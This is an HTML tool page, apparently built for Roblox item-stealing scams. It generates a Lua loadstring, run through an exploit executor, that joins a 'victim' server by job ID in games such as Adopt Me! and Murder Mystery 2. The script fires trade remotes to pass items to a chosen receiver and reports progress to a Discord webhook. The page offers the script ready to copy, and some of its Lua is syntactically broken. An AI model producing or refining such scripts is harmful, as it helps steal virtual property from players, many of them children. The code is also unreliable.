<!DOCTYPE html>
<html>
<head>
    <title>Auto-Joiner Generator</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 700px; margin: 0 auto; }
        .card {
            background: rgba(255,255,255,0.05);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            padding: 32px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        h1 {
            font-size: 28px;
            background: linear-gradient(135deg, #fff 0%, #a855f7 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
        }
        .sub { color: #888; margin-bottom: 32px; font-size: 14px; }
        label { color: #ccc; font-size: 14px; font-weight: 500; display: block; margin-bottom: 8px; }
        input, select {
            width: 100%;
            padding: 14px 16px;
            background: rgba(0,0,0,0.4);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 12px;
            color: white;
            font-size: 14px;
            margin-bottom: 20px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #a855f7 0%, #7c3aed 100%);
            border: none;
            border-radius: 12px;
            color: white;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
        }
        button:disabled { opacity: 0.5; }
        .result {
            margin-top: 32px;
            background: #0a0a0a;
            border-radius: 16px;
            padding: 20px;
        }
        .loadstring {
            background: #000;
            padding: 16px;
            border-radius: 12px;
            font-family: monospace;
            font-size: 12px;
            color: #4ade80;
            word-break: break-all;
            margin-bottom: 16px;
            max-height: 400px;
            overflow: auto;
            white-space: pre-wrap;
        }
        .copy-btn {
            background: #2a2a3e;
            padding: 10px;
            width: auto;
        }
        .status {
            padding: 12px;
            border-radius: 12px;
            margin-top: 16px;
            font-size: 13px;
        }
        .status.loading { background: rgba(168,85,247,0.2); color: #a855f7; }
        .status.success { background: rgba(74,222,128,0.2); color: #4ade80; }
        .status.error { background: rgba(239,68,68,0.2); color: #ef4444; }
        hr { margin: 20px 0; border-color: rgba(255,255,255,0.1); }
        .note {
            background: rgba(168,85,247,0.1);
            padding: 12px;
            border-radius: 12px;
            font-size: 12px;
            color: #a855f7;
            margin-top: 16px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>⚡ Auto-Joiner Generator</h1>
            <div class="sub">Generate your own auto-joiner script</div>
            
            <label>📡 Discord Webhook URL</label>
            <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/123456789/abc-def-ghi">
            <div class="note">💡 Get this from: Discord Server Settings → Integrations → Webhooks → Copy URL</div>
            
            <label>🎮 Target Game ID</label>
            <select id="gameId">
                <option value="142823291">Murder Mystery 2 (142823291)</option>
                <option value="2753915549">Blox Fruits (2753915549)</option>
                <option value="3956818381">Adopt Me! (3956818381)</option>
                <option value="6309113114">Tap Simulator (6309113114)</option>
            </select>
            
            <label>👤 Your Roblox Username (who receives items)</label>
            <input type="text" id="receiverName" placeholder="your_username">
            
            <label>⏱️ Check Interval (seconds)</label>
            <input type="number" id="interval" value="3" min="1" max="10">
            
            <button id="generateBtn">✨ Generate Auto-Joiner Script</button>
            
            <div id="result" style="display: none;">
                <div class="result">
                    <div class="loadstring" id="loadstringOutput"></div>
                    <button class="copy-btn" onclick="copyLoadstring()">📋 Copy Loadstring</button>
                    <div id="statusMsg"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const generateBtn = document.getElementById('generateBtn');
        generateBtn.onclick = generateLoadstring;
        
        async function generateLoadstring() {
            const webhook = document.getElementById('webhook').value;
            const gameId = document.getElementById('gameId').value;
            const receiverName = document.getElementById('receiverName').value;
            const interval = document.getElementById('interval').value;
            
            // Simple validation - just check if it has discord.com and webhook
            if (!webhook || !webhook.includes('discord.com')) {
                alert('Please enter a valid Discord webhook URL (should contain discord.com)');
                return;
            }
            
            if (!receiverName) {
                alert('Please enter your Roblox username');
                return;
            }
            
            const btn = document.getElementById('generateBtn');
            const resultDiv = document.getElementById('result');
            const statusDiv = document.getElementById('statusMsg');
            
            btn.disabled = true;
            btn.textContent = '🔧 Generating...';
            resultDiv.style.display = 'block';
            statusDiv.innerHTML = '<div class="status loading">⏳ Creating script...</div>';
            
            try {
                const response = await fetch('/api/generate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ webhook, gameId, receiverName, interval })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    document.getElementById('loadstringOutput').textContent = data.loadstring;
                    statusDiv.innerHTML = '<div class="status success">✅ Script generated! Copy the loadstring above.</div>';
                } else {
                    // If API fails, generate client-side
                    const fallbackScript = generateFallbackScript(webhook, gameId, receiverName, interval);
                    document.getElementById('loadstringOutput').textContent = fallbackScript;
                    statusDiv.innerHTML = '<div class="status success">✅ Script generated locally! Copy the loadstring above.</div>';
                }
            } catch (err) {
                // If API fails completely, generate client-side
                const fallbackScript = generateFallbackScript(webhook, gameId, receiverName, interval);
                document.getElementById('loadstringOutput').textContent = fallbackScript;
                statusDiv.innerHTML = '<div class="status success">✅ Script generated locally! Copy the loadstring above.</div>';
            } finally {
                btn.disabled = false;
                btn.textContent = '✨ Generate Auto-Joiner Script';
            }
        }
        
        function generateFallbackScript(webhook, gameId, receiverName, interval) {
            const script = `-- AUTO-JOINER SCRIPT
-- Generated for: ${receiverName}
-- Game ID: ${gameId}

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local lp = Players.LocalPlayer

-- CONFIGURATION
local WEBHOOK_URL = "${webhook}"
local TARGET_GAME = ${gameId}
local RECEIVER_NAME = "${receiverName}"
local CHECK_INTERVAL = ${interval}

-- PUT VICTIM'S JOB ID HERE (copy from Discord)
local TARGET_JOB_ID = nil  -- Example: "00000000-0000-0000-0000-000000000000"

-- HTTP request function
local requestFunc = syn and syn.request or request or (http and http.request)

print("[AutoJoiner] Started!")
print("[AutoJoiner] Receiver: " .. RECEIVER_NAME)

-- Send notification to Discord
local function notifyDiscord(message)
    if not requestFunc then return end
    local data = {
        content = message,
        embeds = {{
            title = "Auto-Joiner Status",
            description = "Script is running",
            fields = {
                {name = "Receiver", value = RECEIVER_NAME, inline true},
                {name = "Status", value = message, inline true}
            }
        }}
    }
    pcall(function()
        requestFunc({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- Trade accept function
local function acceptTrade()
    local Trade = ReplicatedStorage:FindFirstChild("Trade")
    if not Trade then
        print("[AutoJoiner] Trade system not found")
        return false
    end
    
    local SendRequest = Trade:FindFirstChild("SendRequest")
    local GetStatus = Trade:FindFirstChild("GetTradeStatus")
    local AcceptTrade = Trade:FindFirstChild("AcceptTrade")
    
    if not SendRequest then
        print("[AutoJoiner] Trade remotes not found")
        return false
    end
    
    -- Send trade request
    local success = pcall(function()
        SendRequest:InvokeServer(RECEIVER_NAME)
    end)
    
    if not success then
        print("[AutoJoiner] Failed to send trade request")
        return false
    end
    
    print("[AutoJoiner] Trade request sent to " .. RECEIVER_NAME)
    notifyDiscord("Trade request sent to " .. RECEIVER_NAME)
    
    -- Wait for trade to start
    task.wait(3)
    
    -- Accept trade
    if AcceptTrade then
        pcall(function()
            AcceptTrade:FireServer(game.PlaceId * 3, {})
            print("[AutoJoiner] Trade accepted!")
        end)
    end
    
    task.wait(5)
    return true
end

-- Main loop
local function main()
    notifyDiscord("Auto-Joiner started!")
    
    while true do
        if game.PlaceId == TARGET_GAME then
            print("[AutoJoiner] In target game!")
            
            -- Find receiver
            local receiver = Players:FindFirstChild(RECEIVER_NAME)
            if receiver then
                print("[AutoJoiner] Found " .. RECEIVER_NAME .. "! Sending trade...")
                acceptTrade()
            else
                print("[AutoJoiner] Waiting for " .. RECEIVER_NAME .. " to join...")
            end
            
            -- Leave after trade
            print("[AutoJoiner] Leaving to find more...")
            task.wait(5)
            pcall(function()
                TeleportService:Teleport(TARGET_GAME)
            end)
            task.wait(5)
        else
            -- Check if we have a target server
            if TARGET_JOB_ID and TARGET_JOB_ID ~= "" then
                print("[AutoJoiner] Joining victim server: " .. TARGET_JOB_ID)
                notifyDiscord("Joining victim server: " .. TARGET_JOB_ID)
                
                local success = pcall(function()
                    TeleportService:TeleportToPlaceInstance(TARGET_GAME, TARGET_JOB_ID, lp)
                end)
                
                if success then
                    print("[AutoJoiner] Teleporting...")
                    TARGET_JOB_ID = nil
                    break
                else
                    print("[AutoJoiner] Failed to join")
                end
            else
                print("[AutoJoiner] Waiting for victim...")
                print("[AutoJoiner] Set TARGET_JOB_ID with the Job ID from Discord")
            end
        end
        
        task.wait(CHECK_INTERVAL)
    end
end

-- Start
local success, err = pcall(main)
if not success then
    warn("[AutoJoiner] Error: " .. tostring(err))
end

-- Restart logic
if game.PlaceId == TARGET_GAME then
    task.wait(10)
    TeleportService:Teleport(TARGET_GAME)
end`;
            
            return `loadstring([=[${script}]=])()`;
        }
        
        function copyLoadstring() {
            const code = document.getElementById('loadstringOutput').textContent;
            navigator.clipboard.writeText(code);
            alert('✅ Loadstring copied to clipboard!');
        }
    </script>
</body>
</html>
